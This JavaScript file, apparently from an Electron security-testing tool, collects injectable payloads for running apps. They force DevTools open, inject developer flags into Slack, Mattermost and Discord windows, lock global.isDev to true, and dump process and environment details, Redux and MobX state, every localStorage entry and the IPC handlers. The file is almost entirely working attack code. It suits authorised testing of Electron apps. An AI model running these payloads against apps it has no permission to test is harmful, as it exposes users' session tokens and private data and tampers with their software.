// Security research payloads for Electron applications - Optimized for passthrough handler


const enable_dev_tools = {
    name: 'DevTools Control',
    description: 'Install DevTools control function with various commands',
    process: 'main',
    code: `
  // Plant DevTools control function
  try {
    // Skip if already installed
    if (global.devToolPayload) {
      return {
        success: true,
        message: 'DevTools Payload is already installed.',
        available_commands: [
          { command: 'status', full_command: 'return devToolPayload("status");', description: 'Get current status' },
          { command: 'enable', full_command: 'return devToolPayload("enable");', description: 'Enable DevTools for all windows' },
          { command: 'disable', full_command: 'return devToolPayload("disable");', description: 'Close DevTools for all windows' },
          { command: 'toggle', full_command: 'return devToolPayload("toggle");', description: 'Toggle DevTools for focused window' },
          { command: 'toggle-panel', full_command: 'return devToolPayload("toggle-panel");', description: 'Same as toggle' },
          { command: 'enable-all', full_command: 'return devToolPayload("enable-all");', description: 'Enable DevTools for all windows' },
          { command: 'inject-flags', full_command: 'return devToolPayload("inject-flags");', description: 'Inject dev flags into renderers' },
          { command: 'setup-shortcuts', full_command: 'return devToolPayload("setup-shortcuts");', description: 'Add keyboard shortcuts' },
          { command: 'reset', full_command: 'return devToolPayload("reset");', description: 'Reset environment variables' }
        ]
      };
    }
  
    // Store original states for restoration
    const originalStates = {
      envVars: {},
      globalProps: {}
    };
  
    // Main DevTools control function
    global.devToolPayload = function(command, options = {}) {
      const results = {
        command: command,
        timestamp: new Date().toISOString(),
        success: false,
        data: {}
      };
  
      try {
        switch (command) {
          case 'status':
            // Get comprehensive status
            const windows = BrowserWindow.getAllWindows();
            results.data = {
              windows: windows.map(win => ({
                id: win.id,
                title: win.getTitle(),
                url: win.webContents ? win.webContents.getURL() : 'unknown',
                devToolsOpen: win.webContents ? win.webContents.isDevToolsOpened() : false,
                focused: win.isFocused()
              })),
              environment: {
                NODE_ENV: process.env.NODE_ENV,
                ELECTRON_IS_DEV: process.env.ELECTRON_IS_DEV,
                globalIsDev: global.isDev
              },
              totalWindows: windows.length,
              openDevTools: windows.filter(w => w.webContents && w.webContents.isDevToolsOpened()).length
            };
            results.success = true;
            break;
  
          case 'enable':
          case 'enable-all':
            // Enable DevTools for all windows
            const allWindows = BrowserWindow.getAllWindows();
            const enableResults = [];
            allWindows.forEach(win => {
              try {
                if (win.webContents) {
                  const wasOpen = win.webContents.isDevToolsOpened();
                  win.webContents.openDevTools();
                  enableResults.push({
                    windowId: win.id,
                    wasAlreadyOpen: wasOpen,
                    success: true
                  });
                }
              } catch (e) {
                enableResults.push({
                  windowId: win.id,
                  error: e.message,
                  success: false
                });
              }
            });
            results.data = {
              windowCount: allWindows.length,
              results: enableResults,
              successCount: enableResults.filter(r => r.success).length
            };
            results.success = true;
            break;
  
          case 'disable':
            // Close DevTools for all windows
            const closeWindows = BrowserWindow.getAllWindows();
            const closeResults = [];
            closeWindows.forEach(win => {
              try {
                if (win.webContents && win.webContents.isDevToolsOpened()) {
                  win.webContents.closeDevTools();
                  closeResults.push({
                    windowId: win.id,
                    success: true
                  });
                }
              } catch (e) {
                closeResults.push({
                  windowId: win.id,
                  error: e.message,
                  success: false
                });
              }
            });
            results.data = { results: closeResults };
            results.success = true;
            break;
  
          case 'toggle':
          case 'toggle-panel':
            // Toggle DevTools for focused window or all windows
            const targetWindows = options.windowId ? 
              [BrowserWindow.fromId(options.windowId)] : 
              (options.all ? BrowserWindow.getAllWindows() : [BrowserWindow.getFocusedWindow()].filter(Boolean));
            const toggleResults = [];
            targetWindows.forEach(win => {
              try {
                if (win && win.webContents) {
                  const wasOpen = win.webContents.isDevToolsOpened();
                  if (wasOpen) {
                    win.webContents.closeDevTools();
                  } else {
                    win.webContents.openDevTools();
                  }
                  toggleResults.push({
                    windowId: win.id,
                    action: wasOpen ? 'closed' : 'opened',
                    success: true
                  });
                }
              } catch (e) {
                toggleResults.push({
                  windowId: win && win.id ? win.id : 'unknown',
                  error: e.message,
                  success: false
                });
              }
            });
            results.data = { results: toggleResults };
            results.success = true;
            break;
  
          case 'inject-flags':
            // Inject dev flags into renderer processes
            const flagWindows = BrowserWindow.getAllWindows();
            const flagResults = [];
            for (const win of flagWindows) {
              if (!win.webContents) continue;
              try {
                const injectionCode = 
                  '(function() {' +
                  '  window.isDev = true;' +
                  '  window.DEV = true;' +
                  '  window.__DEV__ = true;' +
                  '  window.development = true;' +
                  '  window.debug = true;' +
                  '  const flags = { general: true };' +
                  '  if (window.TS) {' +
                  '    window.TS.boot_data = window.TS.boot_data || {};' +
                  '    window.TS.boot_data.feature_developer_tools = true;' +
                  '    window.TS.boot_data.feature_developer_menu = true;' +
                  '    window.TS.boot_data.feature_desktop_developer_devtools = true;' +
                  '    flags.slack = true;' +
                  '  }' +
                  '  if (window.desktop) { flags.mattermost = true; }' +
                  '  if (window.DiscordNative) { flags.discord = true; }' +
                  '  return flags;' +
                  '})();';
  
                win.webContents.executeJavaScript(injectionCode)
                  .then(result => {
                    flagResults.push({
                      windowId: win.id,
                      url: win.webContents.getURL(),
                      flags: result,
                      success: true
                    });
                  })
                  .catch(err => {
                    flagResults.push({
                      windowId: win.id,
                      error: err.message,
                      success: false
                    });
                  });
              } catch (e) {
                flagResults.push({
                  windowId: win.id,
                  error: e.message,
                  success: false
                });
              }
            }
            results.data = { results: flagResults };
            results.success = true;
            break;
  
          case 'setup-shortcuts':
            // Setup keyboard shortcuts in renderer processes
            const shortcutWindows = BrowserWindow.getAllWindows();
            const shortcutResults = [];
            for (const win of shortcutWindows) {
              if (!win.webContents) continue;
              try {
                const shortcutCode = 
                  '(function() {' +
                  '  if (window._devToolsShortcutsInstalled) {' +
                  '    return { message: "Shortcuts already installed" };' +
                  '  }' +
                  '  document.addEventListener("keydown", function(e) {' +
                  '    if (e.key === "F12") {' +
                  '      e.preventDefault();' +
                  '      if (typeof require !== "undefined") {' +
                  '        try {' +
                  '          const { remote } = require("electron");' +
                  '          remote.getCurrentWindow().webContents.toggleDevTools();' +
                  '        } catch (err) {' +
                  '          console.log("F12 shortcut error:", err);' +
                  '        }' +
                  '      }' +
                  '    }' +
                  '  });' +
                  '  document.addEventListener("keydown", function(e) {' +
                  '    if (e.ctrlKey && e.shiftKey && e.key === "I") {' +
                  '      e.preventDefault();' +
                  '      if (typeof require !== "undefined") {' +
                  '        try {' +
                  '          const { remote } = require("electron");' +
                  '          remote.getCurrentWindow().webContents.toggleDevTools();' +
                  '        } catch (err) {' +
                  '          console.log("Ctrl+Shift+I shortcut error:", err);' +
                  '        }' +
                  '      }' +
                  '    }' +
                  '  });' +
                  '  window._devToolsShortcutsInstalled = true;' +
                  '  return { shortcuts: ["F12", "Ctrl+Shift+I"], installed: true };' +
                  '})();';
  
                win.webContents.executeJavaScript(shortcutCode)
                  .then(result => {
                    shortcutResults.push({
                      windowId: win.id,
                      shortcuts: result,
                      success: true
                    });
                  })
                  .catch(err => {
                    shortcutResults.push({
                      windowId: win.id,
                      error: err.message,
                      success: false
                    });
                  });
              } catch (e) {
                shortcutResults.push({
                  windowId: win.id,
                  error: e.message,
                  success: false
                });
              }
            }
            results.data = { results: shortcutResults };
            results.success = true;
            break;
  
          case 'set-env':
            // Set development environment variables
            const envVars = options.vars || {
              'NODE_ENV': 'development',
              'ELECTRON_IS_DEV': '1',
              'SLACK_DEVELOPER_MODE': 'true',
              'MATTERMOST_DEV': 'true'
            };
            const envResults = {};
            Object.entries(envVars).forEach(function(entry) {
              const key = entry[0];
              const value = entry[1];
              originalStates.envVars[key] = process.env[key];
              process.env[key] = value;
              envResults[key] = {
                old: originalStates.envVars[key],
                new: value
              };
            });
            results.data = { environment: envResults };
            results.success = true;
            break;
  
          case 'set-global-flags':
            // Set global development flags
            try {
              // Store original isDev value
              if (typeof global.isDev !== 'undefined') {
                originalStates.globalProps.isDev = global.isDev;
              }
              // Override global.isDev with getter
              Object.defineProperty(global, 'isDev', {
                get: function() { return true; },
                set: function(value) {
                  console.log('[DEV-TOOLS] Prevented changing global.isDev to', value);
                },
                configurable: false,
                enumerable: true
              });
              // Set other dev flags
              const flags = ['DEV', '__DEV__', 'development', 'debug'];
              flags.forEach(function(flag) {
                global[flag] = true;
              });
              results.data = {
                globalIsDev: 'overridden to true',
                otherFlags: flags
              };
              results.success = true;
            } catch (e) {
              results.data = { error: e.message };
            }
            break;
  
          case 'reset':
            // Reset environment variables and flags
            Object.entries(originalStates.envVars).forEach(function(entry) {
              const key = entry[0];
              const value = entry[1];
              if (value === undefined) {
                delete process.env[key];
              } else {
                process.env[key] = value;
              }
            });
            results.data = {
              message: 'Environment variables reset',
              note: 'Global property overrides cannot be easily reset'
            };
            results.success = true;
            break;
  
          default:
            results.data = {
              error: 'Unknown command',
              availableCommands: [
                'status - Get current DevTools status',
                'enable - Enable DevTools for all windows',
                'disable - Close DevTools for all windows',
                'toggle - Toggle DevTools for focused window',
                'toggle-panel - Same as toggle',
                'inject-flags - Inject dev flags into renderers',
                'setup-shortcuts - Add keyboard shortcuts',
                'set-env - Set environment variables',
                'set-global-flags - Override global dev flags',
                'reset - Reset environment variables'
              ]
            };
            break;
        }
      } catch (error) {
        results.error = error.message;
        results.stack = error.stack;
      }
      return results;
    };
  
    // Set up initial environment
    global.devToolPayload('set-env');
    global.devToolPayload('set-global-flags');
  
    return {
      success: true,
      message: 'DevTools Payload installed successfully!',
      available_commands: [
        { command: 'status', full_command: 'return devToolPayload("status");', description: 'Get current status' },
        { command: 'enable', full_command: 'return devToolPayload("enable");', description: 'Enable DevTools for all windows' },
        { command: 'toggle-panel', full_command: 'return devToolPayload("toggle-panel");', description: 'Toggle DevTools panel' },
        { command: 'inject-flags', full_command: 'return devToolPayload("inject-flags");', description: 'Inject dev flags into renderers' },
        { command: 'setup-shortcuts', full_command: 'return devToolPayload("setup-shortcuts");', description: 'Add keyboard shortcuts' }
      ]
    };
  } catch (error) {
    return {
      success: false,
      message: 'Failed to install devToolPayload function: ' + error.message,
      error: error.stack
    };
  }
  `
  };

  const get_process_info = {
    name: 'Get Process Info',
    description: 'Dumps detailed process and environment information',
    process: 'main',
    code: `
  // Get comprehensive process information
  // Context variables available: app, BrowserWindow, windows, versions, platform
  const processInfo = {
    timestamp: new Date().toISOString(),
    process: {
      pid: process.pid,
      ppid: process.ppid || 'unavailable',
      platform: platform || process.platform,
      arch: process.arch,
      versions: versions || process.versions,
      argv: process.argv,
      argv0: process.argv0,
      execPath: process.execPath,
      execArgv: process.execArgv,
      cwd: process.cwd(),
      title: process.title,
      uptime: process.uptime(),
      memoryUsage: process.memoryUsage(),
      cpuUsage: process.cpuUsage(),
      resourceUsage: typeof process.resourceUsage === 'function' ? process.resourceUsage() : null
    },
    environment: {
      NODE_ENV: process.env.NODE_ENV,
      HOME: process.env.HOME,
      USER: process.env.USER,
      PATH: process.env.PATH ? process.env.PATH.split(':').slice(0, 10) : null,
      ELECTRON_IS_DEV: process.env.ELECTRON_IS_DEV,
      ELECTRON_RUN_AS_NODE: process.env.ELECTRON_RUN_AS_NODE
    },
    windows: windows ? windows.map(win => ({
      id: win.id,
      title: win.getTitle(),
      bounds: win.getBounds(),
      isVisible: win.isVisible(),
      isFocused: win.isFocused()
    })) : [],
    features: {
      hasUncaughtExceptionCaptureCallback: typeof process.hasUncaughtExceptionCaptureCallback === 'function',
      allowedNodeEnvironmentFlags: process.allowedNodeEnvironmentFlags ? Array.from(process.allowedNodeEnvironmentFlags) : null
    }
  };
  
  return processInfo;
  `
  };
  
  const get_electron_app_info = {
    name: 'Get Electron App Info',
    description: 'Extracts detailed Electron application information',
    process: 'main',
    code: `
  // Get Electron app information
  // Context variables available: app, BrowserWindow, windows, versions, platform
  if (!app) {
    return { error: 'App context not available' };
  }
  
  const appInfo = {
    timestamp: new Date().toISOString(),
    app: {
      name: app.getName(),
      version: app.getVersion(),
      locale: app.getLocale(),
      isPackaged: app.isPackaged,
      isReady: app.isReady(),
      appPath: app.getAppPath(),
      userDataPath: app.getPath('userData'),
      tempPath: app.getPath('temp'),
      homePath: app.getPath('home'),
      documentsPath: app.getPath('documents'),
      downloadsPath: app.getPath('downloads'),
      desktopPath: app.getPath('desktop'),
      exePath: app.getPath('exe'),
      crashDumpsPath: app.getPath('crashDumps'),
      logsPath: app.getPath('logs')
    },
    features: {
      commandLine: app.commandLine ? {
        appendSwitch: typeof app.commandLine.appendSwitch === 'function',
        hasSwitch: typeof app.commandLine.hasSwitch === 'function'
      } : null,
      dock: platform === 'darwin' ? {
        bounce: typeof app.dock?.bounce === 'function',
        setBadge: typeof app.dock?.setBadge === 'function'
      } : null
    },
    metrics: {
      appMetrics: typeof app.getAppMetrics === 'function' ? app.getAppMetrics() : null,
      gpuFeatureStatus: typeof app.getGPUFeatureStatus === 'function' ? app.getGPUFeatureStatus() : null
    },
    contextInfo: {
      windowsCount: windows ? windows.length : 0,
      platform: platform,
      versions: versions
    }
  };
  
  return appInfo;
  `
  };
  
  const dump_global_variables = {
    name: 'Dump Global Variables',
    description: 'Enumerates and dumps global variables and objects',
    process: 'renderer',
    code: `
  // Dump global variables and interesting objects
  // Context variables available: location, document, localStorage, sessionStorage, navigator
  const globalDump = {
    timestamp: new Date().toISOString(),
    globals: {},
    windowProperties: [],
    electronGlobals: {},
    frameworks: {},
    nodeGlobals: {},
    contextInfo: {
      hasLocation: typeof location !== 'undefined',
      hasDocument: typeof document !== 'undefined',
      hasLocalStorage: typeof localStorage !== 'undefined',
      hasSessionStorage: typeof sessionStorage !== 'undefined',
      hasNavigator: typeof navigator !== 'undefined'
    }
  };
  
  // Check for Node.js globals
  if (typeof global !== 'undefined') {
    globalDump.nodeGlobals.global = Object.keys(global).slice(0, 20);
  }
  if (typeof process !== 'undefined') {
    globalDump.nodeGlobals.process = {
      available: true,
      pid: process.pid,
      platform: process.platform,
      versions: process.versions
    };
  }
  if (typeof require !== 'undefined') {
    globalDump.nodeGlobals.require = {
      available: true,
      cache: Object.keys(require.cache || {}).slice(0, 10)
    };
  }
  
  // Check for Electron-specific globals
  const electronProps = ['require', 'module', 'process', '__dirname', '__filename'];
  electronProps.forEach(function(prop) {
    if (typeof window[prop] !== 'undefined') {
      globalDump.electronGlobals[prop] = typeof window[prop];
    }
  });
  
  // Check for common frameworks/libraries
  const frameworks = ['React', 'ReactDOM', 'Vue', 'Angular', 'jQuery', '$', '_', 'lodash', 'moment', 'axios'];
  frameworks.forEach(function(fw) {
    if (typeof window[fw] !== 'undefined') {
      globalDump.frameworks[fw] = {
        type: typeof window[fw],
        version: window[fw].version || window[fw].VERSION || 'unknown'
      };
    }
  });
  
  // Enumerate interesting window properties
  const interestingProps = [];
  for (let prop in window) {
    if (prop.includes('redux') || prop.includes('store') || prop.includes('state') || 
        prop.includes('config') || prop.includes('app') || prop.includes('api')) {
      interestingProps.push({
        name: prop,
        type: typeof window[prop],
        constructor: window[prop]?.constructor?.name
      });
    }
  }
  globalDump.windowProperties = interestingProps;
  
  // Check for common global state patterns
  if (typeof window.__REDUX_DEVTOOLS_EXTENSION__ !== 'undefined') {
    globalDump.frameworks.reduxDevTools = true;
  }
  
  // Use provided context info
  if (typeof location !== 'undefined') {
    globalDump.location = {
      href: location.href,
      protocol: location.protocol,
      host: location.host,
      pathname: location.pathname
    };
  }
  
  return globalDump;
  `
  };
  
  const find_redux_store = {
    name: 'Find Redux Store',
    description: 'Locates and analyzes Redux store instances',
    process: 'renderer',
    code: `
  // Find and analyze Redux store
  // Context variables available: location, document, localStorage, sessionStorage, navigator
  const reduxAnalysis = {
    timestamp: new Date().toISOString(),
    stores: [],
    devTools: false,
    globalStores: [],
    context: {
      hasDocument: typeof document !== 'undefined',
      documentReady: typeof document !== 'undefined' ? document.readyState : 'unknown'
    }
  };
  
  // Check for Redux DevTools
  if (typeof window.__REDUX_DEVTOOLS_EXTENSION__ !== 'undefined') {
    reduxAnalysis.devTools = true;
  }
  
  // Common Redux store locations
  const storeLocations = [
    'store',
    'reduxStore', 
    '_store',
    'appStore',
    '__store__',
    'globalStore'
  ];
  
  storeLocations.forEach(function(storeLocation) {
    if (typeof window[storeLocation] !== 'undefined') {
      const currentStore = window[storeLocation];
      if (currentStore && typeof currentStore.getState === 'function') {
        try {
          reduxAnalysis.globalStores.push({
            location: storeLocation,
            state: currentStore.getState(),
            hasDispatch: typeof currentStore.dispatch === 'function',
            hasSubscribe: typeof currentStore.subscribe === 'function'
          });
        } catch (e) {
          reduxAnalysis.globalStores.push({
            location: storeLocation,
            error: e.message,
            hasDispatch: typeof currentStore.dispatch === 'function',
            hasSubscribe: typeof currentStore.subscribe === 'function'
          });
        }
      }
    }
  });
  
  // Look for React components with Redux connections
  try {
    if (typeof document !== 'undefined') {
      const reactRoot = document.querySelector('#root, #app, [data-reactroot]');
      if (reactRoot && reactRoot._reactInternalInstance) {
        reduxAnalysis.reactReduxDetected = true;
      }
    }
  } catch (e) {}
  
  // Search for store in React DevTools global hook
  if (typeof window.__REACT_DEVTOOLS_GLOBAL_HOOK__ !== 'undefined') {
    reduxAnalysis.reactDevTools = true;
    try {
      const hook = window.__REACT_DEVTOOLS_GLOBAL_HOOK__;
      if (hook.renderers && hook.renderers.size > 0) {
        reduxAnalysis.reactRenderers = hook.renderers.size;
      }
    } catch (e) {}
  }
  
  return reduxAnalysis;
  `
  };
  
  const dump_redux_state = {
    name: 'Dump Redux State',
    description: 'Extracts current Redux state from all found stores',
    process: 'renderer',
    code: `
  // Dump Redux state from all available stores
  // Context variables available: location, document, localStorage, sessionStorage, navigator
  const stateDump = {
    timestamp: new Date().toISOString(),
    stores: {},
    errors: [],
    context: {
      location: typeof location !== 'undefined' ? location.href : 'unknown',
      documentTitle: typeof document !== 'undefined' ? document.title : 'unknown'
    }
  };
  
  // Common store locations
  const storeLocations = [
    'store', 'reduxStore', '_store', 'appStore', '__store__', 'globalStore',
    'window.store', 'app.store', 'application.store'
  ];
  
  storeLocations.forEach(function(storeLocation) {
    try {
      let targetStore = null;
      
      // Handle nested property access
      if (storeLocation.includes('.')) {
        const parts = storeLocation.split('.');
        targetStore = window;
        for (let i = 0; i < parts.length; i++) {
          targetStore = targetStore[parts[i]];
          if (!targetStore) break;
        }
      } else {
        targetStore = window[storeLocation];
      }
      
      if (targetStore && typeof targetStore.getState === 'function') {
        try {
          const currentState = targetStore.getState();
          stateDump.stores[storeLocation] = {
            state: currentState,
            stateKeys: Object.keys(currentState || {}),
            stateSize: JSON.stringify(currentState).length
          };
        } catch (stateError) {
          stateDump.errors.push('Error getting state from ' + storeLocation + ': ' + stateError.message);
        }
      }
    } catch (e) {
      stateDump.errors.push('Error accessing ' + storeLocation + ': ' + e.message);
    }
  });
  
  // Try to get state from Redux DevTools if available
  if (typeof window.__REDUX_DEVTOOLS_EXTENSION__ !== 'undefined') {
    try {
      const devTools = window.__REDUX_DEVTOOLS_EXTENSION__;
      stateDump.devToolsAvailable = true;
    } catch (e) {
      stateDump.errors.push('Error accessing Redux DevTools: ' + e.message);
    }
  }
  
  // Look for MobX stores as well
  const mobxLocations = ['mobxStore', '_mobxStore', 'rootStore'];
  mobxLocations.forEach(function(mobxLocation) {
    if (typeof window[mobxLocation] !== 'undefined') {
      try {
        stateDump.stores[mobxLocation + '_mobx'] = {
          type: 'mobx',
          store: window[mobxLocation],
          observable: typeof window[mobxLocation].__mobxDidRunLazyInitializers !== 'undefined'
        };
      } catch (e) {
        stateDump.errors.push('Error accessing MobX store ' + mobxLocation + ': ' + e.message);
      }
    }
  });
  
  return stateDump;
  `
  };
  
  const get_window_info = {
    name: 'Get Window Info',
    description: 'Dumps information about Electron windows and browser context',
    process: 'renderer',
    code: `
  // Get comprehensive window and context information
  // Context variables available: location, document, localStorage, sessionStorage, navigator
  const windowInfo = {
    timestamp: new Date().toISOString(),
    location: typeof location !== 'undefined' ? {
      href: location.href,
      protocol: location.protocol,
      host: location.host,
      pathname: location.pathname,
      search: location.search,
      hash: location.hash
    } : { error: 'location not available' },
    navigator: typeof navigator !== 'undefined' ? {
      userAgent: navigator.userAgent,
      platform: navigator.platform,
      language: navigator.language,
      languages: navigator.languages,
      cookieEnabled: navigator.cookieEnabled,
      onLine: navigator.onLine,
      hardwareConcurrency: navigator.hardwareConcurrency
    } : { error: 'navigator not available' },
    screen: typeof window !== 'undefined' && window.screen ? {
      width: window.screen.width,
      height: window.screen.height,
      availWidth: window.screen.availWidth,
      availHeight: window.screen.availHeight,
      colorDepth: window.screen.colorDepth,
      pixelDepth: window.screen.pixelDepth
    } : { error: 'screen not available' },
    window: typeof window !== 'undefined' ? {
      innerWidth: window.innerWidth,
      innerHeight: window.innerHeight,
      outerWidth: window.outerWidth,
      outerHeight: window.outerHeight,
      devicePixelRatio: window.devicePixelRatio,
      isSecureContext: window.isSecureContext
    } : { error: 'window not available' },
    document: typeof document !== 'undefined' ? {
      title: document.title,
      domain: document.domain,
      readyState: document.readyState,
      characterSet: document.characterSet,
      contentType: document.contentType,
      lastModified: document.lastModified
    } : { error: 'document not available' },
    storage: {
      localStorage: typeof localStorage !== 'undefined' ? {
        available: true,
        length: localStorage.length,
        keys: Array.from({length: localStorage.length}, (_, i) => localStorage.key(i))
      } : { available: false },
      sessionStorage: typeof sessionStorage !== 'undefined' ? {
        available: true,
        length: sessionStorage.length,
        keys: Array.from({length: sessionStorage.length}, (_, i) => sessionStorage.key(i))
      } : { available: false }
    },
    electron: {
      nodeIntegration: typeof require !== 'undefined',
      contextIsolation: typeof window.electronAPI !== 'undefined',
      webSecurity: typeof window.webSecurity !== 'undefined' ? window.webSecurity : 'unknown'
    }
  };
  
  // Try to get additional Electron-specific info
  try {
    if (typeof require !== 'undefined') {
      const { remote } = require('electron');
      if (remote) {
        const currentWindow = remote.getCurrentWindow();
        windowInfo.electronWindow = {
          id: currentWindow.id,
          title: currentWindow.getTitle(),
          bounds: currentWindow.getBounds(),
          isVisible: currentWindow.isVisible(),
          isFocused: currentWindow.isFocused(),
          isMaximized: currentWindow.isMaximized(),
          isMinimized: currentWindow.isMinimized(),
          isFullScreen: currentWindow.isFullScreen(),
          isAlwaysOnTop: currentWindow.isAlwaysOnTop(),
          isResizable: currentWindow.isResizable()
        };
      }
    }
  } catch (e) {
    windowInfo.electron.remoteError = e.message;
  }
  
  return windowInfo;
  `
  };

  const dump_local_storage = {
    name: 'Dump Local Storage',
    description: 'Extracts and formats all localStorage contents',
    process: 'renderer',
    code: `
  // Dump localStorage contents
  // Context variables available: location, document, localStorage, sessionStorage, navigator
  const storageDump = {
    timestamp: new Date().toISOString(),
    url: typeof location !== 'undefined' ? location.href : 'unknown',
    localStorage: {},
    errors: []
  };

  try {
    if (typeof localStorage !== 'undefined') {
      // Get all keys
      const keys = Object.keys(localStorage);
      
      // Get values for each key
      keys.forEach(key => {
        try {
          const value = localStorage.getItem(key);
          // Try to parse JSON values
          try {
            storageDump.localStorage[key] = JSON.parse(value);
          } catch {
            // If not JSON, store as is
            storageDump.localStorage[key] = value;
          }
        } catch (e) {
          storageDump.errors.push(\`Error getting value for key "\${key}": \${e.message}\`);
        }
      });

      // Add metadata
      storageDump.metadata = {
        totalKeys: keys.length,
        totalSize: new Blob([JSON.stringify(storageDump.localStorage)]).size,
        hasErrors: storageDump.errors.length > 0
      };
    } else {
      storageDump.errors.push('localStorage is not available in this context');
    }
  } catch (e) {
    storageDump.errors.push(\`Error accessing localStorage: \${e.message}\`);
  }

  return storageDump;
  `
  };

  const enumerate_ipc = {
    name: 'Enumerate IPC Channels',
    description: 'Discovers and analyzes IPC channels and handlers',
    process: 'main',
    code: `
  // Enumerate IPC channels and handlers
  // Context variables available: app, BrowserWindow, windows, versions, platform
  const ipcEnumeration = {
    timestamp: new Date().toISOString(),
    channels: {
      main: {},
      renderer: {},
      bridge: {}
    },
    handlers: [],
    errors: [],
    context: {
      hasIpcMain: typeof ipcMain !== 'undefined',
      hasIpcRenderer: typeof ipcRenderer !== 'undefined',
      hasContextBridge: typeof contextBridge !== 'undefined'
    }
  };

  try {
    // Enumerate ipcMain channels
    if (typeof ipcMain !== 'undefined') {
      // Get all registered handlers
      const mainHandlers = ipcMain._events || {};
      Object.keys(mainHandlers).forEach(channel => {
        try {
          ipcEnumeration.channels.main[channel] = {
            type: typeof mainHandlers[channel],
            isFunction: typeof mainHandlers[channel] === 'function',
            isArray: Array.isArray(mainHandlers[channel]),
            listenerCount: ipcMain.listenerCount(channel)
          };
        } catch (e) {
          ipcEnumeration.errors.push(\`Error analyzing main channel "\${channel}": \${e.message}\`);
        }
      });

      // Get all registered handlers with their metadata
      ipcEnumeration.handlers = Object.entries(mainHandlers).map(([channel, handler]) => ({
        channel,
        type: typeof handler,
        isFunction: typeof handler === 'function',
        isArray: Array.isArray(handler),
        listenerCount: ipcMain.listenerCount(channel),
        source: 'main'
      }));
    }

    // Try to enumerate renderer process channels if possible
    if (typeof ipcRenderer !== 'undefined') {
      const rendererHandlers = ipcRenderer._events || {};
      Object.keys(rendererHandlers).forEach(channel => {
        try {
          ipcEnumeration.channels.renderer[channel] = {
            type: typeof rendererHandlers[channel],
            isFunction: typeof rendererHandlers[channel] === 'function',
            isArray: Array.isArray(rendererHandlers[channel]),
            listenerCount: ipcRenderer.listenerCount(channel)
          };
        } catch (e) {
          ipcEnumeration.errors.push(\`Error analyzing renderer channel "\${channel}": \${e.message}\`);
        }
      });
    }

    // Try to enumerate contextBridge APIs if available
    if (typeof contextBridge !== 'undefined') {
      try {
        // Get all exposed APIs
        const exposedAPIs = contextBridge._exposedAPIs || {};
        Object.keys(exposedAPIs).forEach(api => {
          try {
            ipcEnumeration.channels.bridge[api] = {
              type: typeof exposedAPIs[api],
              methods: Object.keys(exposedAPIs[api] || {}),
              isObject: typeof exposedAPIs[api] === 'object'
            };
          } catch (e) {
            ipcEnumeration.errors.push(\`Error analyzing bridge API "\${api}": \${e.message}\`);
          }
        });
      } catch (e) {
        ipcEnumeration.errors.push(\`Error accessing contextBridge APIs: \${e.message}\`);
      }
    }

    // Add metadata
    ipcEnumeration.metadata = {
      totalMainChannels: Object.keys(ipcEnumeration.channels.main).length,
      totalRendererChannels: Object.keys(ipcEnumeration.channels.renderer).length,
      totalBridgeAPIs: Object.keys(ipcEnumeration.channels.bridge).length,
      totalHandlers: ipcEnumeration.handlers.length,
      hasErrors: ipcEnumeration.errors.length > 0
    };

  } catch (e) {
    ipcEnumeration.errors.push(\`Error during IPC enumeration: \${e.message}\`);
  }

  return ipcEnumeration;
  `
  };

  const payloads = [
    get_process_info,
    get_electron_app_info,
    dump_global_variables,
    find_redux_store,
    dump_redux_state,
    get_window_info,
    enable_dev_tools,
    dump_local_storage,
    enumerate_ipc
  ];
  
  /**
   * Generic payload templating utility
   * @param {string} template - The template string with {{ VAR }} placeholders
   * @param {object} variables - An object with keys matching the template variables
   * @returns {string} - The templated string
   */
  export function templatePayload(template, variables) {
    return template.replace(/\{\{\s*([\w_]+)\s*\}\}/g, (match, key) => {
      return Object.prototype.hasOwnProperty.call(variables, key) ? variables[key] : match;
    });
  }
  
  export default payloads;